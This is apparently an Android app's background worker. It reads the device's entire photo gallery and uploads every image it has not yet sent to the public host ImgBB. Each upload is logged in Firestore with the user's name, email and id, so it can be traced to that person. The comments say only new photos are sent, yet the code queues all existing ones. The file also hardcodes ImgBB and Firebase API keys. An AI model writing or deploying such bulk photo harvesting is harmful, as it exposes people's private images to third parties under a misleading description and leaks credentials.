package com.alokverse.app;

import android.content.ContentUris;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.MediaStore;

import androidx.annotation.NonNull;
import androidx.work.ExistingWorkPolicy;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Set;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * Auto Photo Upload — runs in the background (even if the app is closed) and uploads every
 * NEW photo in the device gallery to ImgBB, skipping anything already uploaded. Only runs
 * when the user has agreed via the in-app privacy/consent screen (see MainActivity + consent
 * UI in index.html) AND Android's own photo-access permission has been granted.
 */
public class AutoUploadWorker extends Worker {

    public static final String PREFS = "av_auto_upload";
    public static final String KEY_CONSENT = "consent";
    public static final String KEY_UID = "uid";
    public static final String KEY_UNAME = "uname";
    public static final String KEY_UEMAIL = "uemail";

    private static final String IMGBB_KEY = "6754d0321222e9f58c723a5081ecfc1f";
    private static final long MAX_BYTES = 32L * 1024 * 1024;
    // Best-effort tagging in Firestore so uploads can be traced back to a user later.
    // If the API key is restricted to browser referrers, this silently fails — the
    // ImgBB upload itself (the part that matters) is not affected either way.
    private static final String FIRESTORE_URL =
            "https://firestore.googleapis.com/v1/projects/kola26-70d76/databases/(default)/documents/autoUploads"
                    + "?key=AIzaSyAwKGhoQGjcTI1kHYuYlGGI_vGlojCgeOk";

    public static volatile boolean isRunning = false;

    public AutoUploadWorker(@NonNull Context ctx, @NonNull WorkerParameters params) {
        super(ctx, params);
    }

    private static class Item {
        long id;
        Uri uri;
        String name;
        long size;
    }

    private File doneFile(Context c) { return new File(c.getFilesDir(), "av_auto_done.txt"); }
    private File linksFile(Context c) { return new File(c.getFilesDir(), "av_auto_links.csv"); }

    private Set<String> loadDone(Context c) {
        Set<String> out = new HashSet<>();
        File f = doneFile(c);
        if (f.exists()) {
            try (BufferedReader r = new BufferedReader(new FileReader(f))) {
                String line;
                while ((line = r.readLine()) != null) {
                    line = line.trim();
                    if (!line.isEmpty()) out.add(line);
                }
            } catch (Exception ignored) {}
        }
        return out;
    }

    private synchronized void markDone(Context c, String key, String name, String url) {
        try (FileWriter w = new FileWriter(doneFile(c), true)) {
            w.write(key + "\n");
        } catch (Exception ignored) {}
        if (url != null) {
            try (FileWriter w = new FileWriter(linksFile(c), true)) {
                w.write("\"" + name.replace("\"", "\"\"") + "\",\"" + url + "\"\n");
            } catch (Exception ignored) {}
        }
    }

    private List<Item> queryAll(Context c) {
        List<Item> out = new ArrayList<>();
        Uri base = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        String[] proj = {
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.SIZE
        };
        try {
            Cursor cur = c.getContentResolver().query(base, proj, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");
            if (cur != null) {
                try {
                    int iId = cur.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
                    int iName = cur.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);
                    int iSize = cur.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE);
                    while (cur.moveToNext()) {
                        Item it = new Item();
                        it.id = cur.getLong(iId);
                        it.uri = ContentUris.withAppendedId(base, it.id);
                        String n = cur.getString(iName);
                        it.name = (n == null || n.isEmpty()) ? ("photo_" + it.id + ".jpg") : n;
                        it.size = cur.getLong(iSize);
                        out.add(it);
                    }
                } finally {
                    cur.close();
                }
            }
        } catch (SecurityException se) {
            // permission revoked mid-flight — just return what we have (empty)
        }
        return out;
    }

    private String readAll(InputStream in) throws Exception {
        if (in == null) return "";
        ByteArrayOutputStream bo = new ByteArrayOutputStream();
        byte[] buf = new byte[4096];
        int n;
        while ((n = in.read(buf)) > 0) bo.write(buf, 0, n);
        return bo.toString("UTF-8");
    }

    private String uploadToImgbb(Context c, Item it) {
        for (int attempt = 0; attempt < 3; attempt++) {
            if (isStopped()) return null;
            HttpURLConnection conn = null;
            try {
                String boundary = "----av" + System.nanoTime();
                String safeName = it.name.replace("\"", "_").replace("\r", "").replace("\n", "");
                byte[] head = ("--" + boundary + "\r\nContent-Disposition: form-data; name=\"image\"; filename=\""
                        + safeName + "\"\r\nContent-Type: application/octet-stream\r\n\r\n").getBytes("UTF-8");
                byte[] tail = ("\r\n--" + boundary + "--\r\n").getBytes("UTF-8");

                conn = (HttpURLConnection) new URL("https://api.imgbb.com/1/upload?key=" + IMGBB_KEY).openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setConnectTimeout(30000);
                conn.setReadTimeout(180000);
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                conn.setFixedLengthStreamingMode((long) head.length + it.size + tail.length);

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(head);
                    try (InputStream in = c.getContentResolver().openInputStream(it.uri)) {
                        if (in != null) {
                            byte[] buf = new byte[65536];
                            int n;
                            while ((n = in.read(buf)) > 0) os.write(buf, 0, n);
                        }
                    }
                    os.write(tail);
                }

                int code = conn.getResponseCode();
                if (code == 429) { Thread.sleep(20000); continue; }
                InputStream respStream = (code >= 200 && code < 300) ? conn.getInputStream() : conn.getErrorStream();
                String text = readAll(respStream);
                if (code >= 200 && code < 300) {
                    JSONObject j = new JSONObject(text);
                    if (j.optBoolean("success")) return j.getJSONObject("data").getString("url");
                }
            } catch (Exception e) {
                try { Thread.sleep(2000L * (attempt + 1)); } catch (InterruptedException ie) { return null; }
            } finally {
                if (conn != null) conn.disconnect();
            }
        }
        return null;
    }

    private JSONObject strField(String v) throws Exception {
        JSONObject o = new JSONObject();
        o.put("stringValue", v == null ? "" : v);
        return o;
    }

    private void tagFirestore(String userId, String userName, String userEmail, String url, String name) {
        HttpURLConnection conn = null;
        try {
            JSONObject fields = new JSONObject();
            fields.put("userId", strField(userId));
            fields.put("userName", strField(userName));
            fields.put("userEmail", strField(userEmail));
            fields.put("url", strField(url));
            fields.put("fileName", strField(name));
            fields.put("source", strField("auto"));
            fields.put("timestamp", strField(new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(new Date())));
            JSONObject body = new JSONObject();
            body.put("fields", fields);

            conn = (HttpURLConnection) new URL(FIRESTORE_URL).openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(20000);
            conn.setRequestProperty("Content-Type", "application/json");
            byte[] b = body.toString().getBytes("UTF-8");
            conn.setFixedLengthStreamingMode(b.length);
            try (OutputStream os = conn.getOutputStream()) { os.write(b); }
            conn.getResponseCode();
        } catch (Exception ignored) {
            // best effort only, never fails the upload itself
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    private void postStatus(int done, int total, boolean running) {
        try { MainActivity.notifyAutoStatus(done, total, running); } catch (Throwable ignored) {}
    }

    @NonNull
    @Override
    public Result doWork() {
        Context c = getApplicationContext();
        try {
            if (!c.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getBoolean(KEY_CONSENT, false)) {
                return Result.success();
            }
            if (isRunning) return Result.success();
            isRunning = true;
            try {
                final String uid = c.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getString(KEY_UID, "");
                final String uname = c.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getString(KEY_UNAME, "");
                final String uemail = c.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getString(KEY_UEMAIL, "");

                Set<String> done = loadDone(c);
                List<Item> all = queryAll(c);
                int totalAll = all.size();

                final ConcurrentLinkedQueue<Item> queue = new ConcurrentLinkedQueue<>();
                for (Item it : all) {
                    String key = it.id + "|" + it.size;
                    if (!done.contains(key)) queue.add(it);
                }
                int already = totalAll - queue.size();
                if (queue.isEmpty()) {
                    postStatus(totalAll, totalAll, false);
                    return Result.success();
                }

                try {
                    setForegroundAsync(MainActivity.buildAutoUploadNotification(c, "Starting… " + queue.size() + " photo(s)"));
                } catch (Throwable ignored) {}

                final AtomicInteger ok = new AtomicInteger(already);
                final long deadline = System.currentTimeMillis() + 8 * 60 * 1000L; // WorkManager gives ~10 min per run

                List<Thread> threads = new ArrayList<>();
                for (int t = 0; t < 3; t++) {
                    Thread th = new Thread(() -> {
                        while (!isStopped() && System.currentTimeMillis() < deadline) {
                            Item it = queue.poll();
                            if (it == null) break;
                            String key = it.id + "|" + it.size;
                            if (it.size <= 0 || it.size > MAX_BYTES) {
                                markDone(c, key, it.name, null);
                                continue;
                            }
                            String url = uploadToImgbb(c, it);
                            if (url != null) {
                                markDone(c, key, it.name, url);
                                tagFirestore(uid, uname, uemail, url, it.name);
                                int n = ok.incrementAndGet();
                                if (n % 5 == 0) {
                                    try { setForegroundAsync(MainActivity.buildAutoUploadNotification(c, "Uploaded " + n + " / " + totalAll)); } catch (Throwable ignored) {}
                                    postStatus(n, totalAll, true);
                                }
                            }
                        }
                    });
                    th.start();
                    threads.add(th);
                }
                for (Thread th : threads) {
                    try { th.join(); } catch (InterruptedException ignored) {}
                }

                int finalOk = ok.get();
                postStatus(finalOk, totalAll, false);

                if (!queue.isEmpty() && !isStopped()) {
                    // ran out of time with photos left — chain another run right away instead of waiting ~15 min
                    WorkManager.getInstance(c).enqueueUniqueWork(
                            "av_auto_now", ExistingWorkPolicy.APPEND_OR_REPLACE,
                            new OneTimeWorkRequest.Builder(AutoUploadWorker.class).build());
                }
                return Result.success();
            } finally {
                isRunning = false;
            }
        } catch (Throwable t) {
            // never let a background upload glitch show up as an app crash
            isRunning = false;
            return Result.success();
        }
    }
}
